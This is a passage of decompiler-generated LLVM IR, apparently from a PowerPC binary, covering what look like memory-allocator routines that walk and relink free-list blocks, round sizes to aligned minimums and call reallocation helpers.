  %v3_1000c600 = load i32, i32* @global_var_1001eb58.498, align 4
  store i32 %v4_1000c5f8, i32* @r29, align 4
  %v1_1000c608 = inttoptr i32 %v4_1000c5f8 to i32*
  %v2_1000c608 = load i32, i32* %v1_1000c608, align 4
  store i32 %v2_1000c608, i32* @r27, align 4
  %v1_1000c60c = mul i32 %v3_1000c600, 8
  %v2_1000c610 = icmp ult i32 %v2_1000c608, %v1_1000c60c
  br i1 %v2_1000c610, label %dec_label_pc_1000c644, label %dec_label_pc_1000c618

dec_label_pc_1000c618:                            ; preds = %dec_label_pc_1000c5d0
  store i32 ptrtoint (i32* @global_var_1001ee3c.499 to i32), i32* @r28, align 4
  %v0_1000c628 = call i32 @function_1000cf4c()
  store i32 268486196, i32* @lr, align 4
  %v1_1000c630 = call i32 @function_1000d76c(i32 0)
  %v0_1000c634 = load i32, i32* @r31, align 4
  %v4_1000c634 = icmp eq i32 %v0_1000c634, %v1_1000c630
  br i1 %v4_1000c634, label %dec_label_pc_1000c64c, label %dec_label_pc_1000c63c

dec_label_pc_1000c63c:                            ; preds = %dec_label_pc_1000c618
  %v0_1000c640 = call i32 @function_1000cf4c()
  br label %dec_label_pc_1000c644

dec_label_pc_1000c644:                            ; preds = %dec_label_pc_1000c5d0, %dec_label_pc_1000c63c
  br label %dec_label_pc_1000c6a0

dec_label_pc_1000c64c:                            ; preds = %dec_label_pc_1000c618
  %v0_1000c64c = load i32, i32* @r29, align 4
  %v1_1000c64c = add i32 %v0_1000c64c, 4
  %v2_1000c64c = inttoptr i32 %v1_1000c64c to i32*
  %v3_1000c64c = load i32, i32* %v2_1000c64c, align 4
  %v3_1000c650 = icmp eq i32 %v3_1000c64c, 0
  br i1 %v3_1000c650, label %dec_label_pc_1000c660, label %dec_label_pc_1000c658

dec_label_pc_1000c658:                            ; preds = %dec_label_pc_1000c64c
  %v1_1000c658 = add i32 %v0_1000c64c, 8
  %v2_1000c658 = inttoptr i32 %v1_1000c658 to i32*
  %v3_1000c658 = load i32, i32* %v2_1000c658, align 4
  %v2_1000c65c = add i32 %v3_1000c64c, 8
  %v3_1000c65c = inttoptr i32 %v2_1000c65c to i32*
  store i32 %v3_1000c658, i32* %v3_1000c65c, align 4
  %v0_1000c660.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c660

dec_label_pc_1000c660:                            ; preds = %dec_label_pc_1000c64c, %dec_label_pc_1000c658
  %v0_1000c660 = phi i32 [ %v0_1000c64c, %dec_label_pc_1000c64c ], [ %v0_1000c660.pre, %dec_label_pc_1000c658 ]
  %v1_1000c660 = add i32 %v0_1000c660, 8
  %v2_1000c660 = inttoptr i32 %v1_1000c660 to i32*
  %v3_1000c660 = load i32, i32* %v2_1000c660, align 4
  %v1_1000c664 = add i32 %v0_1000c660, 4
  %v2_1000c664 = inttoptr i32 %v1_1000c664 to i32*
  %v3_1000c664 = load i32, i32* %v2_1000c664, align 4
  %v3_1000c668 = icmp eq i32 %v3_1000c660, 0
  br i1 %v3_1000c668, label %dec_label_pc_1000c678, label %dec_label_pc_1000c670

dec_label_pc_1000c670:                            ; preds = %dec_label_pc_1000c660
  %v2_1000c670 = add i32 %v3_1000c660, 4
  %v3_1000c670 = inttoptr i32 %v2_1000c670 to i32*
  store i32 %v3_1000c664, i32* %v3_1000c670, align 4
  br label %dec_label_pc_1000c67c

dec_label_pc_1000c678:                            ; preds = %dec_label_pc_1000c660
  store i32 %v3_1000c664, i32* @global_var_1001eb00, align 4
  br label %dec_label_pc_1000c67c

dec_label_pc_1000c67c:                            ; preds = %dec_label_pc_1000c670, %dec_label_pc_1000c678
  %v0_1000c684 = call i32 @function_1000cf4c()
  %v0_1000c688 = load i32, i32* @r27, align 4
  %v1_1000c688 = load i32, i32* @r29, align 4
  %v0_1000c690 = load i32, i32* @r31, align 4
  %v2_1000c688 = sub i32 12, %v0_1000c688
  %v1_1000c68c = add i32 %v2_1000c688, %v1_1000c688
  %v2_1000c690 = sub i32 %v1_1000c68c, %v0_1000c690
  store i32 268486296, i32* @lr, align 4
  %v1_1000c694 = call i32 @function_1000d76c(i32 %v2_1000c690)
  br label %dec_label_pc_1000c6a0

dec_label_pc_1000c6a0:                            ; preds = %dec_label_pc_1000c644, %dec_label_pc_1000c67c
  %v0_1000c6a0 = call i32 @function_1000cf4c()
  br label %dec_label_pc_1000c6a4

dec_label_pc_1000c6a4:                            ; preds = %dec_label_pc_1000c5b8, %dec_label_pc_1000c6a0
  %.0 = phi i32 [ undef, %dec_label_pc_1000c5b8 ], [ %v0_1000c6a0, %dec_label_pc_1000c6a0 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000c660, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_1000d76c, { 3, 2, 1, 0 }
  uselistorder i32* @r26, { 33, 24, 0, 1, 2, 3, 4, 5, 6, 7, 25, 26, 27, 28, 29, 30, 31, 32, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 34, 35, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_1000c6a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c67c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c660, { 1, 0 }
  uselistorder label %dec_label_pc_1000c644, { 1, 0 }
}

define i32 @function_1000c6b8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c6b8:
  %r27.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v3_1000c6b8 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000c6b8, label %dec_label_pc_1000c6d4, label %dec_label_pc_1000c6e0

dec_label_pc_1000c6d4:                            ; preds = %dec_label_pc_1000c6b8
  store i32 ptrtoint ([3 x i8]* @global_var_1000c6d8.503 to i32), i32* @lr, align 4
  %v0_1000c6d4 = call i32 @function_1000c5b8()
  br label %dec_label_pc_1000c6ec

dec_label_pc_1000c6e0:                            ; preds = %dec_label_pc_1000c6b8
  %v3_1000c6e0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000c6e0, label %dec_label_pc_1000c6ec, label %dec_label_pc_1000c6f8

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6e0, %dec_label_pc_1000c6d4
  %storemerge = phi i32 [ 0, %dec_label_pc_1000c6d4 ], [ %arg2, %dec_label_pc_1000c6e0 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268486384, i32* @lr, align 4
  %v0_1000c6ec = call i32 @function_1000c3f0()
  store i32 %v0_1000c6ec, i32* @r28, align 4
  br label %dec_label_pc_1000c7d0

dec_label_pc_1000c6f8:                            ; preds = %dec_label_pc_1000c6e0
  %v1_1000c6f8 = add i32 %arg2, 7
  %v1_1000c6fc = add i32 %arg1, -4
  store i32 %v1_1000c6fc, i32* %r27.global-to-local, align 4
  %v1_1000c700 = call i32 @__asm_rlwinm(i32 %v1_1000c6f8, i32 0, i32 0, i32 29)
  store i32 %v1_1000c700, i32* @r31, align 4
  %v2_1000c704 = inttoptr i32 %v1_1000c6fc to i32*
  %v3_1000c704 = load i32, i32* %v2_1000c704, align 4
  store i32 %v3_1000c704, i32* @r30, align 4
  %v2_1000c708 = icmp ugt i32 %v1_1000c700, 11
  br i1 %v2_1000c708, label %dec_label_pc_1000c714, label %dec_label_pc_1000c710

dec_label_pc_1000c710:                            ; preds = %dec_label_pc_1000c6f8
  store i32 12, i32* @r31, align 4
  br label %dec_label_pc_1000c714

dec_label_pc_1000c714:                            ; preds = %dec_label_pc_1000c6f8, %dec_label_pc_1000c710
  %v0_1000c794 = phi i32 [ %v1_1000c700, %dec_label_pc_1000c6f8 ], [ 12, %dec_label_pc_1000c710 ]
  %v3_1000c714 = icmp ugt i32 %v0_1000c794, %v3_1000c704
  br i1 %v3_1000c714, label %dec_label_pc_1000c71c, label %dec_label_pc_1000c794

dec_label_pc_1000c71c:                            ; preds = %dec_label_pc_1000c714
  store i32 ptrtoint (i32* @global_var_1001ebf4.495 to i32), i32* @r29, align 4
  %v0_1000c728 = call i32 @function_1000cf4c()
  %v0_1000c730 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000c730 = load i32, i32* @r30, align 4
  %v2_1000c730 = add i32 %v1_1000c730, %v0_1000c730
  %v1_1000c734 = load i32, i32* @r31, align 4
  %v2_1000c734 = sub i32 %v1_1000c734, %v1_1000c730
  %v4_1000c73c = call i32 @function_1000c888(i32* nonnull @global_var_1001eb00, i32 %v2_1000c730, i32 %v2_1000c734)
  store i32 %v4_1000c73c, i32* %r27.global-to-local, align 4
  %v0_1000c748 = call i32 @function_1000cf4c()
  %v3_1000c74c = icmp eq i32 %v4_1000c73c, 0
  br i1 %v3_1000c74c, label %dec_label_pc_1000c760, label %dec_label_pc_1000c754

dec_label_pc_1000c754:                            ; preds = %dec_label_pc_1000c71c
  %v0_1000c754 = load i32, i32* @r30, align 4
  %v2_1000c754 = add i32 %v0_1000c754, %v4_1000c73c
  %v1_1000c758 = load i32, i32* @r28, align 4
  %v2_1000c758 = add i32 %v1_1000c758, -4
  %v3_1000c758 = inttoptr i32 %v2_1000c758 to i32*
  store i32 %v2_1000c754, i32* %v3_1000c758, align 4
  br label %dec_label_pc_1000c7d0

dec_label_pc_1000c760:                            ; preds = %dec_label_pc_1000c71c
  %v0_1000c760 = load i32, i32* @r31, align 4
  %v1_1000c760 = add i32 %v0_1000c760, -4
  store i32 %v1_1000c760, i32* @r3, align 4
  store i32 268486504, i32* @lr, align 4
  %v0_1000c764 = call i32 @function_1000c3f0()
  store i32 %v0_1000c764, i32* @r3, align 4
  store i32 %v0_1000c764, i32* @r31, align 4
  %v3_1000c768 = icmp eq i32 %v0_1000c764, 0
  br i1 %v3_1000c768, label %dec_label_pc_1000c770, label %dec_label_pc_1000c778

dec_label_pc_1000c770:                            ; preds = %dec_label_pc_1000c760
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000c7d0

dec_label_pc_1000c778:                            ; preds = %dec_label_pc_1000c760
  %v0_1000c778 = load i32, i32* @r28, align 4
  store i32 %v0_1000c778, i32* @r4, align 4
  %v0_1000c77c = load i32, i32* @r30, align 4
  %v1_1000c77c = add i32 %v0_1000c77c, -4
  store i32 %v1_1000c77c, i32* @r5, align 4
  store i32 268486532, i32* @lr, align 4
  %v0_1000c780 = call i32 @function_1000bb50()
  %v0_1000c784 = load i32, i32* @r28, align 4
  store i32 %v0_1000c784, i32* @r3, align 4
  store i32 268486540, i32* @lr, align 4
  %v0_1000c788 = call i32 @function_1000c5b8()
  %v0_1000c78c = load i32, i32* @r31, align 4
  store i32 %v0_1000c78c, i32* @r28, align 4
  br label %dec_label_pc_1000c7d0

dec_label_pc_1000c794:                            ; preds = %dec_label_pc_1000c714
  %v1_1000c794 = add i32 %v0_1000c794, 28
  %v3_1000c798 = icmp ugt i32 %v1_1000c794, %v3_1000c704
  br i1 %v3_1000c798, label %dec_label_pc_1000c7d0, label %dec_label_pc_1000c7a0

dec_label_pc_1000c7a0:                            ; preds = %dec_label_pc_1000c794
  store i32 ptrtoint (i32* @global_var_1001ebf4.495 to i32), i32* @r29, align 4
  %v0_1000c7ac = call i32 @function_1000cf4c()
  %v0_1000c7b4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000c7b4 = load i32, i32* @r31, align 4
  %v2_1000c7b4 = add i32 %v1_1000c7b4, %v0_1000c7b4
  %v1_1000c7b8 = load i32, i32* @r30, align 4
  %v2_1000c7b8 = sub i32 %v1_1000c7b8, %v1_1000c7b4
  store i32 268486596, i32* @lr, align 4
  %v4_1000c7c0 = call i32 @function_1000c96c(i32* nonnull @global_var_1001eb00, i32 %v2_1000c7b4, i32 %v2_1000c7b8)
  %v0_1000c7c8 = call i32 @function_1000cf4c()
  %v0_1000c7cc = load i32, i32* @r31, align 4
  %v1_1000c7cc = load i32, i32* @r28, align 4
  %v2_1000c7cc = add i32 %v1_1000c7cc, -4
  %v3_1000c7cc = inttoptr i32 %v2_1000c7cc to i32*
  store i32 %v0_1000c7cc, i32* %v3_1000c7cc, align 4
  br label %dec_label_pc_1000c7d0

dec_label_pc_1000c7d0:                            ; preds = %dec_label_pc_1000c794, %dec_label_pc_1000c778, %dec_label_pc_1000c770, %dec_label_pc_1000c754, %dec_label_pc_1000c6ec, %dec_label_pc_1000c7a0
  %v0_1000c7d4 = load i32, i32* @r28, align 4
  ret i32 %v0_1000c7d4

; uselistorder directives
  uselistorder i32 %v1_1000c7b4, { 1, 0 }
  uselistorder i32 %v4_1000c73c, { 1, 0, 2 }
  uselistorder i32 %v1_1000c730, { 1, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1001eb00, { 0, 1, 3, 2, 4 }
  uselistorder i32 ()* @function_1000c3f0, { 4, 3, 0, 7, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 2, 1, 8, 6, 5 }
  uselistorder i32 ()* @function_1000c5b8, { 4, 3, 7, 6, 5, 11, 10, 9, 8, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000c7d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000c714, { 1, 0 }
}

define i32 @function_1000c7e8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c7e8:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000c7e8 = inttoptr i32 %arg2 to i32*
  %v2_1000c7e8 = load i32, i32* %v1_1000c7e8, align 4
  %v1_1000c7ec = add i32 %v2_1000c7e8, 3
  store i32 %v1_1000c7ec, i32* %r9.global-to-local, align 4
  %v1_1000c7f0 = call i32 @__asm_rlwinm(i32 %v1_1000c7ec, i32 0, i32 0, i32 29)
  %v2_1000c7f4 = icmp ugt i32 %v1_1000c7f0, 11
  br i1 %v2_1000c7f4, label %dec_label_pc_1000c878.preheader, label %dec_label_pc_1000c7fc

dec_label_pc_1000c7fc:                            ; preds = %dec_label_pc_1000c7e8
  br label %dec_label_pc_1000c878.preheader

dec_label_pc_1000c878.preheader:                  ; preds = %dec_label_pc_1000c7e8, %dec_label_pc_1000c7fc
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000c7fc ], [ %v1_1000c7f0, %dec_label_pc_1000c7e8 ]
  %v0_1000c85c = phi i32 [ 12, %dec_label_pc_1000c7fc ], [ %v1_1000c7f0, %dec_label_pc_1000c7e8 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000c8785 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000c8785, label %dec_label_pc_1000c880, label %dec_label_pc_1000c808

dec_label_pc_1000c808:                            ; preds = %dec_label_pc_1000c878.preheader, %dec_label_pc_1000c874
  %v0_1000c874 = phi i32 [ %storemerge, %dec_label_pc_1000c874 ], [ %storemerge2, %dec_label_pc_1000c878.preheader ]
  %v1_1000c808 = inttoptr i32 %v0_1000c874 to i32*
  %v2_1000c808 = load i32, i32* %v1_1000c808, align 4
  store i32 %v2_1000c808, i32* %r10.global-to-local, align 4
  %v2_1000c80c = icmp ult i32 %v2_1000c808, %v0_1000c85c
  br i1 %v2_1000c80c, label %dec_label_pc_1000c874, label %dec_label_pc_1000c814

dec_label_pc_1000c814:                            ; preds = %dec_label_pc_1000c808
  %v1_1000c814 = add i32 %v0_1000c85c, 44
  %v2_1000c818 = icmp ult i32 %v2_1000c808, %v1_1000c814
  br i1 %v2_1000c818, label %dec_label_pc_1000c820, label %dec_label_pc_1000c85c

dec_label_pc_1000c820:                            ; preds = %dec_label_pc_1000c814
  %v1_1000c820 = add i32 %v0_1000c874, 4
  %v2_1000c820 = inttoptr i32 %v1_1000c820 to i32*
  %v3_1000c820 = load i32, i32* %v2_1000c820, align 4
  store i32 %v3_1000c820, i32* %r11.global-to-local, align 4
  %v3_1000c824 = icmp eq i32 %v3_1000c820, 0
  br i1 %v3_1000c824, label %dec_label_pc_1000c834, label %dec_label_pc_1000c82c

dec_label_pc_1000c82c:                            ; preds = %dec_label_pc_1000c820
  %v1_1000c82c = add i32 %v0_1000c874, 8
  %v2_1000c82c = inttoptr i32 %v1_1000c82c to i32*
  %v3_1000c82c = load i32, i32* %v2_1000c82c, align 4
  %v2_1000c830 = add i32 %v3_1000c820, 8
  %v3_1000c830 = inttoptr i32 %v2_1000c830 to i32*
  store i32 %v3_1000c82c, i32* %v3_1000c830, align 4
  %v0_1000c834.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000c850.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000c834

dec_label_pc_1000c834:                            ; preds = %dec_label_pc_1000c820, %dec_label_pc_1000c82c
  %v0_1000c850 = phi i32 [ %v2_1000c808, %dec_label_pc_1000c820 ], [ %v0_1000c850.pre, %dec_label_pc_1000c82c ]
  %v0_1000c834 = phi i32 [ %v0_1000c874, %dec_label_pc_1000c820 ], [ %v0_1000c834.pre, %dec_label_pc_1000c82c ]
  %v1_1000c834 = add i32 %v0_1000c834, 8
  %v2_1000c834 = inttoptr i32 %v1_1000c834 to i32*
  %v3_1000c834 = load i32, i32* %v2_1000c834, align 4
  %v1_1000c838 = add i32 %v0_1000c834, 4
  %v2_1000c838 = inttoptr i32 %v1_1000c838 to i32*
  %v3_1000c838 = load i32, i32* %v2_1000c838, align 4
  %v3_1000c83c = icmp eq i32 %v3_1000c834, 0
  store i32 %v0_1000c850, i32* %r11.global-to-local, align 4
  br i1 %v3_1000c83c, label %dec_label_pc_1000c850, label %dec_label_pc_1000c844

dec_label_pc_1000c844:                            ; preds = %dec_label_pc_1000c834
  %v2_1000c848 = add i32 %v3_1000c834, 4
  %v3_1000c848 = inttoptr i32 %v2_1000c848 to i32*
  store i32 %v3_1000c838, i32* %v3_1000c848, align 4
  br label %dec_label_pc_1000c864

dec_label_pc_1000c850:                            ; preds = %dec_label_pc_1000c834
  store i32 %v3_1000c838, i32* %arg1, align 4
  br label %dec_label_pc_1000c864

dec_label_pc_1000c85c:                            ; preds = %dec_label_pc_1000c814
  %v2_1000c85c = sub i32 %v2_1000c808, %v0_1000c85c
  store i32 %v2_1000c85c, i32* %v1_1000c808, align 4
  br label %dec_label_pc_1000c864

dec_label_pc_1000c864:                            ; preds = %dec_label_pc_1000c850, %dec_label_pc_1000c844, %dec_label_pc_1000c85c
  %v0_1000c864 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c864 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000c864 = sub i32 %v1_1000c864, %v0_1000c864
  store i32 %v2_1000c864, i32* %r9.global-to-local, align 4
  %v0_1000c868 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c868, i32* %v1_1000c7e8, align 4
  %v0_1000c86c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c86c = add i32 %v0_1000c86c, 12
  ret i32 %v1_1000c86c

dec_label_pc_1000c874:                            ; preds = %dec_label_pc_1000c808
  %v1_1000c874 = add i32 %v0_1000c874, 4
  %storemerge.in = inttoptr i32 %v1_1000c874 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000c878 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000c878, label %dec_label_pc_1000c878.dec_label_pc_1000c880_crit_edge, label %dec_label_pc_1000c808

dec_label_pc_1000c878.dec_label_pc_1000c880_crit_edge: ; preds = %dec_label_pc_1000c874
  br label %dec_label_pc_1000c880

dec_label_pc_1000c880:                            ; preds = %dec_label_pc_1000c878.dec_label_pc_1000c880_crit_edge, %dec_label_pc_1000c878.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000c834, { 1, 0 }
  uselistorder i32 %v2_1000c808, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000c874, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000c85c, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000c864, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c834, { 1, 0 }
  uselistorder label %dec_label_pc_1000c808, { 1, 0 }
  uselistorder label %dec_label_pc_1000c878.preheader, { 1, 0 }
}

define i32 @function_1000c888(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c888:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000c888 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c888, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v1_1000c890 = add i32 %arg3, 3
  %v3_1000c9143 = icmp eq i32 %v2_1000c888, 0
  br i1 %v3_1000c9143, label %dec_label_pc_1000c91c, label %dec_label_pc_1000c898

dec_label_pc_1000c898:                            ; preds = %dec_label_pc_1000c888, %dec_label_pc_1000c910
  %v0_1000c910 = phi i32 [ %v3_1000c910, %dec_label_pc_1000c910 ], [ %v2_1000c888, %dec_label_pc_1000c888 ]
  %v1_1000c898 = inttoptr i32 %v0_1000c910 to i32*
  %v2_1000c898 = load i32, i32* %v1_1000c898, align 4
  %v2_1000c89c = sub i32 %v0_1000c910, %v2_1000c898
  %v1_1000c8a0 = add i32 %v2_1000c89c, 12
  %v3_1000c8a4 = icmp ugt i32 %v1_1000c8a0, %arg2
  br i1 %v3_1000c8a4, label %dec_label_pc_1000c910, label %dec_label_pc_1000c8ac

dec_label_pc_1000c8ac:                            ; preds = %dec_label_pc_1000c898
  %v4_1000c8a4 = icmp eq i32 %v1_1000c8a0, %arg2
  br i1 %v4_1000c8a4, label %dec_label_pc_1000c8b4, label %dec_label_pc_1000c91c

dec_label_pc_1000c8b4:                            ; preds = %dec_label_pc_1000c8ac
  %v1_1000c8b4 = call i32 @__asm_rlwinm(i32 %v1_1000c890, i32 0, i32 0, i32 29)
  %v2_1000c8b8 = icmp ult i32 %v2_1000c898, %v1_1000c8b4
  br i1 %v2_1000c8b8, label %dec_label_pc_1000c91c, label %dec_label_pc_1000c8c0

dec_label_pc_1000c8c0:                            ; preds = %dec_label_pc_1000c8b4
  %v1_1000c8c0 = add i32 %v1_1000c8b4, 44
  %v2_1000c8c4 = icmp ult i32 %v2_1000c898, %v1_1000c8c0
  br i1 %v2_1000c8c4, label %dec_label_pc_1000c8cc, label %dec_label_pc_1000c900

dec_label_pc_1000c8cc:                            ; preds = %dec_label_pc_1000c8c0
  %v0_1000c8cc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c8cc = add i32 %v0_1000c8cc, 4
  %v2_1000c8cc = inttoptr i32 %v1_1000c8cc to i32*
  %v3_1000c8cc = load i32, i32* %v2_1000c8cc, align 4
  %v3_1000c8d0 = icmp eq i32 %v3_1000c8cc, 0
  br i1 %v3_1000c8d0, label %dec_label_pc_1000c8e0, label %dec_label_pc_1000c8d8

dec_label_pc_1000c8d8:                            ; preds = %dec_label_pc_1000c8cc
  %v1_1000c8d8 = add i32 %v0_1000c8cc, 8
  %v2_1000c8d8 = inttoptr i32 %v1_1000c8d8 to i32*
  %v3_1000c8d8 = load i32, i32* %v2_1000c8d8, align 4
  %v2_1000c8dc = add i32 %v3_1000c8cc, 8
  %v3_1000c8dc = inttoptr i32 %v2_1000c8dc to i32*
  store i32 %v3_1000c8d8, i32* %v3_1000c8dc, align 4
  %v0_1000c8e0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c8e0

dec_label_pc_1000c8e0:                            ; preds = %dec_label_pc_1000c8cc, %dec_label_pc_1000c8d8
  %v0_1000c8e0 = phi i32 [ %v0_1000c8cc, %dec_label_pc_1000c8cc ], [ %v0_1000c8e0.pre, %dec_label_pc_1000c8d8 ]
  %v1_1000c8e0 = add i32 %v0_1000c8e0, 8
  %v2_1000c8e0 = inttoptr i32 %v1_1000c8e0 to i32*
  %v3_1000c8e0 = load i32, i32* %v2_1000c8e0, align 4
  %v1_1000c8e4 = add i32 %v0_1000c8e0, 4
  %v2_1000c8e4 = inttoptr i32 %v1_1000c8e4 to i32*
  %v3_1000c8e4 = load i32, i32* %v2_1000c8e4, align 4
  %v3_1000c8e8 = icmp eq i32 %v3_1000c8e0, 0
  br i1 %v3_1000c8e8, label %dec_label_pc_1000c8f8, label %dec_label_pc_1000c8f0

dec_label_pc_1000c8f0:                            ; preds = %dec_label_pc_1000c8e0
  %v2_1000c8f0 = add i32 %v3_1000c8e0, 4
  %v3_1000c8f0 = inttoptr i32 %v2_1000c8f0 to i32*
  store i32 %v3_1000c8e4, i32* %v3_1000c8f0, align 4
  ret i32 %v2_1000c898

dec_label_pc_1000c8f8:                            ; preds = %dec_label_pc_1000c8e0
  %v1_1000c8f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000c8f8 = inttoptr i32 %v1_1000c8f8 to i32*
  store i32 %v3_1000c8e4, i32* %v2_1000c8f8, align 4
  ret i32 %v2_1000c898

dec_label_pc_1000c900:                            ; preds = %dec_label_pc_1000c8c0
  %v2_1000c900 = sub i32 %v2_1000c898, %v1_1000c8b4
  %v1_1000c908 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c908 = inttoptr i32 %v1_1000c908 to i32*
  store i32 %v2_1000c900, i32* %v2_1000c908, align 4
  ret i32 %v1_1000c8b4

dec_label_pc_1000c910:                            ; preds = %dec_label_pc_1000c898
  %v1_1000c910 = add i32 %v0_1000c910, 4
  %v2_1000c910 = inttoptr i32 %v1_1000c910 to i32*
  %v3_1000c910 = load i32, i32* %v2_1000c910, align 4
  store i32 %v3_1000c910, i32* %r11.global-to-local, align 4
  %v3_1000c914 = icmp eq i32 %v3_1000c910, 0
  br i1 %v3_1000c914, label %dec_label_pc_1000c914.dec_label_pc_1000c91c.loopexit_crit_edge, label %dec_label_pc_1000c898

dec_label_pc_1000c914.dec_label_pc_1000c91c.loopexit_crit_edge: ; preds = %dec_label_pc_1000c910
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c888, %dec_label_pc_1000c914.dec_label_pc_1000c91c.loopexit_crit_edge, %dec_label_pc_1000c8ac, %dec_label_pc_1000c8b4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000c910, { 1, 2, 0 }
  uselistorder i32 %v0_1000c8e0, { 1, 0 }
  uselistorder i32 %v1_1000c8b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000c898, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000c910, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 29, { 24, 36, 25, 37, 4, 5, 52, 53, 50, 51, 56, 57, 38, 39, 54, 55, 0, 1, 6, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 19, 20, 21, 7, 8, 11, 12, 13, 14, 9, 10, 15, 16, 17, 18, 2, 22, 3, 23, 40, 41, 42, 43, 46, 47, 44, 45, 48, 49 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000c91c, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000c8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c898, { 1, 0 }
}

define i32 @function_1000c924(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c924:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000c924 = icmp eq i32 %arg3, 0
  %v2_1000c928 = add i32 %arg2, 4
  %v3_1000c928 = inttoptr i32 %v2_1000c928 to i32*
  store i32 %arg4, i32* %v3_1000c928, align 4
  %v2_1000c92c = add i32 %arg2, 8
  %v3_1000c92c = inttoptr i32 %v2_1000c92c to i32*
  store i32 %arg3, i32* %v3_1000c92c, align 4
  br i1 %v3_1000c924, label %dec_label_pc_1000c93c, label %dec_label_pc_1000c934

dec_label_pc_1000c934:                            ; preds = %dec_label_pc_1000c924
  %v2_1000c934 = add i32 %arg3, 4
  %v3_1000c934 = inttoptr i32 %v2_1000c934 to i32*
  store i32 %arg2, i32* %v3_1000c934, align 4
  br label %dec_label_pc_1000c940

dec_label_pc_1000c93c:                            ; preds = %dec_label_pc_1000c924
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000c940

dec_label_pc_1000c940:                            ; preds = %dec_label_pc_1000c934, %dec_label_pc_1000c93c
  %v3_1000c940 = icmp eq i32 %arg4, 0
  %v0_1000c944 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c940, i32 %v0_1000c944)
  %v2_1000c948 = add i32 %arg4, 8
  %v3_1000c948 = inttoptr i32 %v2_1000c948 to i32*
  store i32 %arg2, i32* %v3_1000c948, align 4
  ret i32 %tmp

; uselistorder directives
